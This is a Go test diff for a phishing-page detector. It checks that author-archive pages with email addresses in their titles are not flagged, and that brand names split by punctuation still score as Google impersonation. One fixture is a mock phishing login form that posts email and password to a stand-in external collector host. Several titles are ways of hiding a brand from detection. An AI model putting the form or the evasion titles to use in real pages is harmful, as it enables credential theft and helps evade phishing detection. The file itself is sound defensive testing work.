@@ -95,12 +95,59 @@ func TestAnalyzePHPForPhishingWebmailAddressInTitleIsNotImpersonation(t *testing
 // reason to read the author's own address as brand impersonation.
 func TestPhishingWebmailAddressInTitleWithLoginWidgetIsNotImpersonation(t *testing.T) {
 	widget := `<form action="/wp-login.php" method="post"><input type="text" name="log"><input type="password" name="pwd"></form></body>`
-	page := strings.Replace(strings.Replace(authorArchiveTemplate, "%TITLE%", "Posts by jane.doe@gmail.com - Example Blog", 1), "</body>", widget, 1)
-	if res := analyzeHTMLForPhishing(context.Background(), writeHTMLForPhishingTest(t, "index.html", page)); res != nil {
-		t.Errorf("html: author archive with login widget flagged as %s phishing: %v", res.brand, res.indicators)
+	for _, address := range []string{
+		"jane.doe@gmail.com",
+		"jane%@gmail.com",
+		"gmail.reader+blog@example.net",
+		"jane-doe@mail.gmail.com",
+		"jane@gmail.example-blog.net",
+	} {
+		t.Run(address, func(t *testing.T) {
+			page := strings.Replace(strings.Replace(authorArchiveTemplate, "%TITLE%", "Posts by "+address+" - Example Blog", 1), "</body>", widget, 1)
+			if res := analyzeHTMLForPhishing(context.Background(), writeHTMLForPhishingTest(t, "index.html", page)); res != nil {
+				t.Errorf("html: author archive with login widget flagged as %s phishing: %v", res.brand, res.indicators)
+			}
+			php := `<?php if (!empty($_POST['pwd'])) { wp_signon(); } ?>` + page
+			if res := analyzePHPForPhishing(context.Background(), writeHTMLForPhishingTest(t, "author.php", php)); res != nil {
+				t.Errorf("php: author template with login widget flagged as %s phishing: %v", res.brand, res.indicators)
+			}
+		})
 	}
-	php := `<?php if (!empty($_POST['pwd'])) { wp_signon(); } ?>` + page
-	if res := analyzePHPForPhishing(context.Background(), writeHTMLForPhishingTest(t, "author.php", php)); res != nil {
-		t.Errorf("php: author template with login widget flagged as %s phishing: %v", res.brand, res.indicators)
+}
+
+func TestPhishingTitleEmailSeparatorsStillScoreBrand(t *testing.T) {
+	for _, title := range []string{
+		"Gmail...user@example.net",
+		"user@example.net...Gmail",
+		"user@example.net-.Gmail",
+		"user@...Gmail.com",
+		"user@-Gmail.com",
+		"user@Gmail-.com",
+		"user@Gmail..com",
+		"Gmail&hellip;user@example.net",
+		"user@example.net&hellip;Gmail",
+		"jane@gmail.com | GmailLogin",
+	} {
+		t.Run(title, func(t *testing.T) {
+			page := `<html><head><title>` + title + `</title></head><body>
+<form action="https://collector.example.net/p.php" method="post">
+<input type="email" name="email"><input type="password" name="password"></form></body></html>`
+			for _, ext := range []string{".html", ".php"} {
+				body := page
+				if ext == ".php" {
+					body = `<?php $p = $_POST['email']; ?>` + page
+				}
+				path := writeHTMLForPhishingTest(t, "login"+ext, body)
+				var res *phishingResult
+				if ext == ".html" {
+					res = analyzeHTMLForPhishing(context.Background(), path)
+				} else {
+					res = analyzePHPForPhishing(context.Background(), path)
+				}
+				if res == nil || res.brand != "Google" || res.score != 5 {
+					t.Errorf("%s: title punctuation hid the brand: %+v", ext, res)
+				}
+			}
+		})
 	}
 }
